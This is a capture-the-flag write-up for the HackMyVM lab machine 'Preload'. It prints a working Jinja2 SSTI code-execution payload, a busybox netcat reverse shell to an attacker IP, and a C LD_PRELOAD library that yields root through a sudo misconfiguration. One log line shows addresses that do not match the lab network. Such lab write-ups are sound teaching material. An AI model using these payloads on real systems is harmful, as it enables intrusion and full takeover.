# Preload

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Preload | avijneyam | Beginner | HackMyVM |

**Summary:** 
Preload is a beginner-level vulnerable machine from HackMyVM that demonstrates classic web application exploitation techniques combined with Linux privilege escalation. The attack path involves discovering multiple network services through port scanning, triggering a hidden Flask application via an HTTP/0.9 request on port 5000, exploiting a Server-Side Template Injection (SSTI) vulnerability in Jinja2 to achieve remote code execution as the user `paul`, and finally escalating privileges to root by abusing the `LD_PRELOAD` environment variable with sudo permissions. This machine provides excellent hands-on practice for identifying non-standard service behaviors, fuzzing web parameters, crafting SSTI payloads, and understanding shared library injection techniques for privilege escalation.

---

## Reconnaissance

### Network Discovery

The initial reconnaissance began with a network scan to identify active hosts within the subnet. A custom PowerShell script was used to enumerate virtual machine targets:

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.101 08:00:27:D0:D4:E6 VirtualBox
```

The scan successfully identified the target machine at IP address `192.168.100.101`, confirmed to be a VirtualBox virtual machine based on the MAC address vendor prefix.

### Port Scanning and Service Enumeration

A comprehensive Nmap scan was conducted to identify all open ports and running services on the target:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/preload]
└─$ nmap -sC -sV -p- -T4 192.168.100.101
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-11 10:03 WIB
Nmap scan report for 192.168.100.101
Host is up (0.038s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey:
|   3072 4f:4c:82:94:2b:99:f8:ea:67:ff:67:3c:06:8a:71:b5 (RSA)
|   256 c4:2c:9b:c8:12:93:2f:8a:f1:57:1c:f6:ab:88:b9:61 (ECDSA)
|_  256 10:18:7b:11:c4:c3:d4:1a:54:cc:18:68:14:bb:2e:a7 (ED25519)
80/tcp   open  http       nginx 1.18.0
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.18.0
5000/tcp open  landesk-rc LANDesk remote management
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.00 seconds
```

**Key Findings:**
- **Port 22/TCP**: OpenSSH 8.4p1 Debian 5 (potential entry point, but requires credentials)
- **Port 80/TCP**: Nginx 1.18.0 web server (primary investigation target)
- **Port 5000/TCP**: Identified as "LANDesk remote management" (anomalous service requiring further analysis)

---

## Web Application Analysis

### Port 80 Investigation

The nginx web server on port 80 was examined to understand its configuration and identify potential attack vectors:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/preload]
└─$ curl -I http://192.168.100.101/
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Wed, 11 Feb 2026 03:38:28 GMT
Content-Type: text/html
Connection: keep-alive

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/preload]
└─$ curl http://192.168.100.101/
<!DOCTYPE html>
<html>
<head>
<title>Welcome to nginx!</title>
<style>
    body {
        width: 35em;
        margin: 0 auto;
        font-family: Tahoma, Verdana, Arial, sans-serif;
    }
</style>
</head>
<body>
<h1>Welcome to nginx!</h1>
<p>If you see this page, the nginx web server is successfully installed and
working. Further configuration is required.</p>

<p>For online documentation and support please refer to
<a href="/?multiply=7*7">notnginx.org</a>.<br/>
Commercial support is available at
<a href="http://nginx.com/">nginx.com</a>.</p>

<p><em>Thank you for using nginx.</em></p>
</body>
</html>
```

**Critical Discovery:** The HTML source contained a suspicious link with a URL parameter: `<a href="/?multiply=7*7">notnginx.org</a>`. This parameter structure (`multiply=7*7`) immediately raised suspicion of a Server-Side Template Injection (SSTI) vulnerability, as mathematical expressions are commonly used to test template engines.

### Port 5000 Investigation - Hidden Flask Application

Initial attempts to connect to port 5000 using standard HTTP/1.1 requests failed:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/preload]
└─$ curl http://192.168.100.101:5000/
curl: (1) Received HTTP/0.9 when not allowed

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/preload]
└─$ curl -I --http0.9 http://192.168.100.101:5000/
curl: (8) Weird server reply
```

The error message "Received HTTP/0.9 when not allowed" provided a crucial hint. By explicitly allowing HTTP/0.9 protocol, the service responded:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/preload]
└─$ curl --http0.9 http://192.168.100.101:5000/
 * Serving Flask app 'code' (lazy loading)
 * Environment: production
   WARNING: This is a development server. Do not use it in a production deployment.
   Use a production WSGI server instead.
 * Debug mode: off
 * Running on all addresses.
   WARNING: This is a development server. Do not use it in a production deployment.
 * Running on http://192.168.100.101:50000/ (Press CTRL+C to quit)
```

**Breakthrough Discovery:** The HTTP/0.9 request to port 5000 acted as a **trigger mechanism** that launched a Flask application on port 50000. This revealed:
- The application is a Flask development server running Python code from a file named `code.py`
- The server is now listening on port **50000** instead of 5000
- The environment is production with debug mode disabled

### Confirming Port 50000 Availability

After triggering the Flask application, a targeted Nmap scan confirmed the new port was now accessible:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/preload]
└─$ nmap -p 50000 192.168.100.101
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-11 10:44 WIB
Nmap scan report for 192.168.100.101
Host is up (0.00069s latency).

PORT      STATE SERVICE
50000/tcp open  ibm-db2

Nmap done: 1 IP address (1 host up) scanned in 1.15 seconds

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/preload]
└─$ curl -I http://192.168.100.101:50000/
HTTP/1.0 500 INTERNAL SERVER ERROR
Content-Type: text/html; charset=utf-8
Content-Length: 290
Server: Werkzeug/2.0.2 Python/3.9.2
Date: Wed, 11 Feb 2026 03:44:55 GMT
```

The server identification confirmed:
- **Werkzeug/2.0.2** - Flask's development WSGI server
- **Python/3.9.2** - The underlying Python interpreter version
- **HTTP 500 error** - The application is running but encountering errors (likely due to missing parameters)

---

## Vulnerability Discovery and Exploitation

### SSTI Parameter Fuzzing

The initial hint from port 80 (`/?multiply=7*7`) suggested a parameter-based SSTI. Testing this parameter directly on port 50000 still resulted in errors:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/preload]
└─$ curl -I http://192.168.100.101:50000/?multiply=7*7
HTTP/1.0 500 INTERNAL SERVER ERROR
Content-Type: text/html; charset=utf-8
Content-Length: 290
Server: Werkzeug/2.0.2 Python/3.9.2
Date: Wed, 11 Feb 2026 03:47:11 GMT
```

To discover the correct parameter name, a fuzzing attack was launched using `ffuf` with a common parameters wordlist:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/preload]
└─$ ffuf -u "http://192.168.100.101:50000/?FUZZ=7*7" -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -fs 290

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.100.101:50000/?FUZZ=7*7
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 290
________________________________________________

cmd                     [Status: 200, Size: 3, Words: 1, Lines: 1, Duration: 268ms]
:: Progress: [4750/4750] :: Job [1/1] :: 108 req/sec :: Duration: [0:00:36] :: Errors: 0 ::
```

**Success!** The fuzzing revealed the correct parameter name: **`cmd`**

### SSTI Confirmation and Payload Testing

With the correct parameter identified, SSTI testing proceeded:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/preload]
└─$ curl -I http://192.168.100.101:50000/?cmd=7*7
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 3
Server: Werkzeug/2.0.2 Python/3.9.2
Date: Wed, 11 Feb 2026 03:51:21 GMT

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/preload]
└─$ curl http://192.168.100.101:50000/?cmd=7*7
7*7
```

The literal string "7*7" was returned without evaluation, indicating the parameter accepts input but isn't directly evaluating Python code. Testing with Jinja2 template syntax:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/preload]
└─$ curl http://192.168.100.101:50000/?cmd={{7*7}}
curl: (3) nested brace in URL position 36:
http://192.168.100.101:50000/?cmd={{7*7}}
                                   ^

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/preload]
└─$ curl -g http://192.168.100.101:50000/?cmd={{7*7}}
49
```

**SSTI Confirmed!** The mathematical expression `{{7*7}}` evaluated to `49`, confirming a Jinja2 SSTI vulnerability. The `-g` flag was required to disable curl's URL globbing feature, which treats curly braces as special characters.

### Remote Code Execution via SSTI

To achieve code execution, a Jinja2 SSTI payload was crafted using the Method Resolution Order (MRO) technique to access Python's built-in functions and import the `os` module:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/preload]
└─$ curl -g "http://192.168.100.101:50000/?cmd={{self.__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}"
uid=1000(paul) gid=1000(paul) groups=1000(paul)
```

**Payload Breakdown:**
1. `self.__init__.__globals__` - Access the global namespace from the template context
2. `['__builtins__']` - Access Python's built-in functions
3. `['__import__']('os')` - Import the `os` module
4. `.popen('id')` - Execute the `id` command in a subprocess
5. `.read()` - Read the command output

The successful execution confirmed remote code execution as the user `paul` (UID 1000).

---

## Initial Access - Reverse Shell

### Establishing Listener

A Netcat listener was prepared on the attacking machine to receive the reverse shell connection:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/preload]
└─$ nc -nvlp 4444
listening on [any] 4444 ...
```

### Triggering Reverse Shell

A reverse shell payload was constructed using `busybox nc`, which is commonly available on minimal Linux systems. The payload was URL-encoded and delivered through the SSTI vulnerability:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/preload]
└─$ curl -g "http://192.168.100.101:50000/?cmd={{self.__init__.__globals__['__builtins__']['__import__']('os').popen('busybox%20nc%20192.168.100.1%204444%20-e%20%2Fbin%2Fbash').read()}}"
```

**Payload Explanation:**
- `busybox%20nc` - BusyBox netcat implementation (URL-encoded space)
- `192.168.100.1%204444` - Attacker IP and port
- `-e%20%2Fbin%2Fbash` - Execute `/bin/bash` upon connection (URL-encoded)

### Successful Connection

The reverse shell successfully connected:

```bash
connect to [172.21.44.133] from (UNKNOWN) [172.21.32.1] 64812
id
uid=1000(paul) gid=1000(paul) groups=1000(paul)
```

### Shell Stabilization

To improve shell usability, a full pseudo-TTY was spawned using Python and terminal settings were configured:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")' || python -c 'import pty; pty.spawn("/bin/bash")'
paul@preload:/$ ^Z
zsh: suspended  nc -nvlp 4444

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/preload]
└─$ stty raw -echo; fg
[1]  + continued  nc -nvlp 4444

paul@preload:/$ export SHELL=bash
paul@preload:/$ export TERM=xterm
paul@preload:/$ stty rows 75 cols 200
paul@preload:/$ reset
```

**Stabilization Steps:**
1. Spawn a Python PTY for job control and proper input handling
2. Background the Netcat session with `Ctrl+Z`
3. Configure raw terminal mode with `stty raw -echo` to pass all input directly
4. Resume the backgrounded session with `fg`
5. Set proper shell environment variables (`SHELL`, `TERM`)
6. Configure terminal dimensions for proper display
7. Reset terminal state for clean output

---

## Post-Exploitation Enumeration

### User Environment Analysis

Once access was established as `paul`, the home directory was enumerated:

```bash
paul@preload:/$ cd
paul@preload:~$ ls -la
total 24
drwxr-xr-x 2 paul paul 4096 Jan  8  2022 .
drwxr-xr-x 3 root root 4096 Dec  1  2021 ..
lrwxrwxrwx 1 paul paul    9 Jan  8  2022 .bash_history -> /dev/null
-rw-r--r-- 1 root root  571 Jan  8  2022 .bashrc
-rwxr-xr-x 1 paul paul  358 Jan  8  2022 code.py
-rw-r--r-- 1 paul paul  807 Aug  4  2021 .profile
-rw-r--r-- 1 paul paul   33 Jan  8  2022 us3r.txt
```

**Notable Findings:**
- `.bash_history` is symlinked to `/dev/null` (command history disabled for security)
- `code.py` - The Flask application source code (owned by paul, world-readable)
- `us3r.txt` - User flag file (33 bytes, likely a hash format)

**User Flag Retrieved:**
The user flag was captured but redacted in this writeup for security purposes.

---

## Privilege Escalation

### Sudo Permissions Analysis

The privilege escalation phase began with examining sudo permissions:

```bash
paul@preload:~$ which sudo
/usr/bin/sudo
paul@preload:~$ sudo -l
Matching Defaults entries for paul on preload:
    env_reset, mail_badpass, env_keep+=LD_PRELOAD, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User paul may run the following commands on preload:
    (root) NOPASSWD: /usr/bin/cat, /usr/bin/cut, /usr/bin/grep, /usr/bin/tail, /usr/bin/head, /usr/bin/ss
```

**Critical Security Misconfiguration Identified:**

The sudo configuration revealed two significant elements:
1. **Allowed commands**: `cat`, `cut`, `grep`, `tail`, `head`, `ss` can be run as root without password
2. **Environment preservation**: **`env_keep+=LD_PRELOAD`** - This is the key vulnerability

The `LD_PRELOAD` environment variable allows users to specify shared libraries that should be loaded before all others when executing a program. Combined with sudo permissions, this creates a privilege escalation vector.

### LD_PRELOAD Exploitation

The `LD_PRELOAD` technique works by injecting a malicious shared library that will be loaded when any sudo-permitted binary is executed. The library's `_init()` function runs before the main program, allowing arbitrary code execution as root.

**Malicious Shared Library Creation:**

A C source file was created in `/tmp` to craft the privilege escalation exploit:

```bash
paul@preload:~$ cat << EOF > /tmp/pe.c
> #include <stdio.h>
> #include <sys/types.h>
> #include <stdlib.h>
> #include <unistd.h>
>
> void _init() {
>     unsetenv("LD_PRELOAD");
>     setuid(0);
>     setgid(0);
>     system("/bin/bash -p");
> }
> EOF
paul@preload:~$ cat /tmp/pe.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
```

**Code Explanation:**
- `void _init()` - Constructor function executed when library loads
- `unsetenv("LD_PRELOAD")` - Remove the environment variable to prevent recursive loading
- `setuid(0)` and `setgid(0)` - Set user and group IDs to root (0)
- `system("/bin/bash -p")` - Spawn a privileged bash shell (`-p` preserves privileges)

**Compilation to Shared Object:**

```bash
paul@preload:~$ gcc -fPIC -shared -o /tmp/pe.so /tmp/pe.c -nostartfiles
```

**Compilation Flags:**
- `-fPIC` - Generate Position Independent Code (required for shared libraries)
- `-shared` - Create a shared library instead of executable
- `-o /tmp/pe.so` - Output filename
- `-nostartfiles` - Don't link standard startup files (we define `_init()` manually)

### Root Access Achieved

The malicious shared library was loaded via `LD_PRELOAD` when executing any sudo-permitted command:

```bash
paul@preload:~$ sudo LD_PRELOAD=/tmp/pe.so /usr/bin/cat
root@preload:/home/paul# cd
root@preload:~# id
uid=0(root) gid=0(root) groups=0(root)
root@preload:~# whoami
root
root@preload:~# hostname
preload
root@preload:~# cat /home/paul/us3r.txt /root/20o7.txt
[REDACTED]28c
[REDACTED]3b3
```

**Root Achieved!**

The `_init()` function executed before `/usr/bin/cat`, spawning a root shell. Both user and root flags were successfully captured.

**How It Works:**
1. The `sudo` command executes `/usr/bin/cat` with root privileges
2. Due to `env_keep+=LD_PRELOAD`, the `LD_PRELOAD=/tmp/pe.so` environment variable is preserved
3. The dynamic linker loads `/tmp/pe.so` before executing `cat`
4. The `_init()` function runs automatically during library initialization
5. UIDs are set to 0 (root) and a privileged bash shell spawns
6. The attacker now has full root access

---

## Attack Chain Summary

1. **Reconnaissance**: Conducted network discovery and full port scan, identifying SSH (22), HTTP/Nginx (80), and an unusual service on port 5000 (labeled as LANDesk but actually a Flask trigger).

2. **Vulnerability Discovery**: Found SSTI hint in nginx default page (`/?multiply=7*7`). Discovered that HTTP/0.9 request to port 5000 triggers a hidden Flask application on port 50000. Fuzzed parameters with `ffuf` to identify `cmd` parameter vulnerable to Jinja2 SSTI.

3. **Exploitation**: Exploited Server-Side Template Injection (SSTI) in Jinja2 template engine using `{{self.__init__.__globals__}}` technique to achieve remote code execution. Verified RCE with `id` command, then delivered a BusyBox netcat reverse shell payload to gain initial access as user `paul`.

4. **Internal Enumeration**: Stabilized reverse shell with Python PTY. Enumerated user environment and discovered `code.py` (Flask app source), `us3r.txt` (user flag), and checked sudo permissions revealing `env_keep+=LD_PRELOAD` configuration with NOPASSWD access to utilities like `cat`, `grep`, `tail`, etc.

5. **Privilege Escalation**: Exploited `LD_PRELOAD` environment variable preservation in sudo configuration by creating a malicious shared library (`pe.so`) with a constructor function that sets UID/GID to 0 and spawns a privileged bash shell. Executed `sudo LD_PRELOAD=/tmp/pe.so /usr/bin/cat` to trigger library loading and obtain root shell, successfully capturing root flag.

